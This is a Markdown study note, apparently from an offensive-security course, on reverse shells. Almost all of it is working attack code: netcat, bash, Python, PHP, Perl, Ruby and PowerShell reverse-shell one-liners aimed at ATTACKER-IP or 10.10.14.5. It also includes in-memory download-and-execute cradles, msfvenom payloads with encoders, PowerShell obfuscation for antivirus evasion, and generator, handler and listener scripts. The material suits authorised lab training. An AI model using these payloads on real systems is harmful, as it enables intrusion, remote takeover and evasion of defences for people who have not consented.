---
tags: [module/shells-payloads, reverse-shell, netcat, ncat, powercat, msfvenom, av-evasion, level/advanced, practical]
---

# Reverse Shells - Practical Application

## Complete Reverse Shell Workflow

Phase 1: Netcat Reverse Shells
Phase 2: PowerShell Reverse Shells
Phase 3: Ncat Advanced Features
Phase 4: PowerCat
Phase 5: Msfvenom Payloads
Phase 6: AV Evasion Techniques
Phase 7: Automation

---

## Phase 1: Netcat Reverse Shells

### Basic Netcat Reverse Shell

**On Attacker (listener):**
nc -lvnp 443

**On Target (Linux):**
nc -e /bin/sh ATTACKER-IP 443

**On Target (Windows):**
nc.exe -e cmd.exe ATTACKER-IP 443

### Netcat Without -e (Linux)

If netcat lacks -e flag:

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER-IP 443 > /tmp/f

### Netcat with Different Ports

# Use port 80 (HTTP)
nc -lvnp 80

# Use port 53 (DNS)
nc -lvnp 53

# Use port 443 (HTTPS)
nc -lvnp 443

---

## Phase 2: PowerShell Reverse Shells

### Basic PowerShell Reverse Shell

powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER-IP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

### PowerShell Without Powershell.exe

# Using cscript and WScript.Shell
cscript /nologo /e:jscript "var s=new ActiveXObject('WScript.Shell'); s.Run('powershell -c IEX (New-Object Net.WebClient).DownloadString(''http://10.10.14.5/rev.ps1'')')"

### PowerShell Download Cradle + Execution

# Download and execute in memory
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/rev.ps1')"

### PowerShell Base64 Encoded Command

$command = '$client = New-Object System.Net.Sockets.TCPClient("10.10.14.5",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded

---

## Phase 3: Ncat Advanced Features

### Ncat SSL Encrypted Reverse Shell

**On Attacker (listener with SSL):**
ncat --ssl -lvnp 443

**On Target:**
ncat --ssl ATTACKER-IP 443 -e /bin/bash

### Ncat with Connection Brokering

# On broker machine
ncat --broker --listen -p 5555

# On attacker (connects to broker)
ncat BROKER-IP 5555

# On target (connects to broker with shell)
ncat BROKER-IP 5555 --keep-open --exec "/bin/bash"

### Ncat with Proxy

ncat --proxy proxy:8080 --proxy-type http --ssl ATTACKER-IP 443 -e /bin/bash

---

## Phase 4: PowerCat

### PowerCat Reverse Shell

# Download PowerCat
Invoke-WebRequest -Uri "http://10.10.14.5/powercat.ps1" -OutFile powercat.ps1

# Import module
Import-Module .\powercat.ps1

# Reverse shell
powercat -c ATTACKER-IP -p 443 -e cmd.exe

### PowerCat Encrypted

powercat -c ATTACKER-IP -p 443 -e cmd.exe -s

### PowerCat Payload Generation

# Generate payload to file
powercat -c ATTACKER-IP -p 443 -e cmd.exe -g > rev.ps1

# Generate base64 encoded payload
powercat -c ATTACKER-IP -p 443 -e cmd.exe -ge > rev.ps1.b64

---

## Phase 5: Msfvenom Payloads

### Msfvenom Reverse Shell Payloads

# Windows executable
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=443 -f exe -o rev.exe

# Linux executable
msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=443 -f elf -o rev.elf

# PHP
msfvenom -p php/reverse_php LHOST=ATTACKER-IP LPORT=443 -f raw -o rev.php

# ASP
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=443 -f asp -o rev.asp

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER-IP LPORT=443 -f raw -o rev.jsp

# Python
msfvenom -p cmd/unix/reverse_python LHOST=ATTACKER-IP LPORT=443 -f raw

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=ATTACKER-IP LPORT=443 -f raw

# PowerShell
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=443 -f ps1 -o rev.ps1

### Staged vs Stageless Payloads

# Staged (smaller, requires handler)
msfvenom -p windows/shell/reverse_tcp LHOST=ATTACKER-IP LPORT=443 -f exe -o staged.exe

# Stageless (larger, self-contained)
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=443 -f exe -o stageless.exe

### Encoded Payloads

# Shikata ga nai encoding (x86)
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=443 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# Multiple encoders
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=443 -e x86/shikata_ga_nai -i 5 -e x86/call4_dword_xor -i 3 -f exe -o super-encoded.exe

---

## Phase 6: AV Evasion Techniques

### PowerShell Obfuscation

# Variable obfuscation
$c = New-Object System.Net.Sockets.TCPClient('10.10.14.5',443);
$s = $c.GetStream();
[byte[]]$b = 0..65535|%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb2 = $sb + 'PS ' + (pwd).Path + '> ';
    $sb3 = ([text.encoding]::ASCII).GetBytes($sb2);
    $s.Write($sb3,0,$sb3.Length);
    $s.Flush()
};
$c.Close()

### String Splitting

$ip = "10." + "10." + "14." + "5"
$port = 443
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)

### Comment Obfuscation

powershell -c "IEX <# comment #> (New-Object <# comment #> Net.WebClient).DownloadString('http://10.10.14.5/rev.ps1')"

### Base64 Encoding

# Encode payload
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.5/rev.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)

# Execute
powershell -EncodedCommand $encoded

### Custom Binary Compilation

# Compile C# reverse shell
csc /target:exe /out:rev.exe rev.cs

---

## Phase 7: Automation

### Reverse Shell Generator Script

Save as reverse-shell-gen.py:

#!/usr/bin/env python3
import argparse

def generate_reverse_shell(lhost, lport, shell_type):
    shells = {
        'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        'nc': f"nc -e /bin/sh {lhost} {lport}",
        'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        'php': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        'perl': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'",
        'ruby': f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{lhost}\",\"{lport}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
        'powershell': f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
    }
    
    if shell_type in shells:
        return shells[shell_type]
    else:
        return "Shell type not found"

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--lhost', required=True)
    parser.add_argument('--lport', required=True, type=int)
    parser.add_argument('--type', required=True, choices=['bash','nc','python','php','perl','ruby','powershell'])
    args = parser.parse_args()
    
    cmd = generate_reverse_shell(args.lhost, args.lport, args.type)
    print("[*] Reverse shell command:")
    print(cmd)

### Multi-Handler Script (Metasploit)

Save as handler.rc:

use exploit/multi/handler
set PAYLOAD windows/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false
exploit -j -z

Run with:
msfconsole -r handler.rc

### Persistent Listener Script

Save as listener.sh:

#!/bin/bash
PORT=$1
PROTOCOL=${2:-tcp}

echo "[*] Starting persistent listener on port $PORT"

while true; do
    echo "[*] Waiting for connection..."
    
    if [ "$PROTOCOL" == "ssl" ]; then
        ncat --ssl -lvnp $PORT
    else
        nc -lvnp $PORT
    fi
    
    if [ $? -eq 0 ]; then
        echo "[+] Connection received"
        echo "[*] Session ended, restarting listener..."
    else
        echo "[-] Listener stopped"
        exit 1
    fi
    
    sleep 2
done

---

## Reverse Shell Cheatsheet

| Language | Command |
|----------|---------|
| Netcat | nc -e /bin/sh ATTACKER-IP 443 |
| Bash | bash -i >& /dev/tcp/ATTACKER-IP/443 0>&1 |
| Python | python -c 'import...' |
| PHP | php -r '$sock=fsockopen("ATTACKER-IP",443);exec("/bin/sh -i <&3 >&3 2>&3");' |
| Perl | perl -e 'use Socket;$i="ATTACKER-IP";$p=443;...' |
| Ruby | ruby -rsocket -e 'c=TCPSocket.new("ATTACKER-IP","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' |
| PowerShell | powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client..." |
| Msfvenom (exe) | msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=443 -f exe -o rev.exe |
| Msfvenom (elf) | msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=443 -f elf -o rev.elf |

---

## Key Takeaways

- Reverse shell = target connects to you
- Use common ports (443, 80, 53) to evade firewalls
- PowerShell one-liner is the standard for Windows
- Ncat adds SSL encryption
- PowerCat brings netcat to PowerShell
- Msfvenom generates payloads for all platforms
- AV evasion requires obfuscation or encoding
- Base64 encoding bypasses some detection
- Staged vs stageless payloads have trade-offs
- Always have your listener ready first
- Test your payloads in the target environment
- Master multiple languages for different targets
- The PowerShell one-liner will be your most-used tool
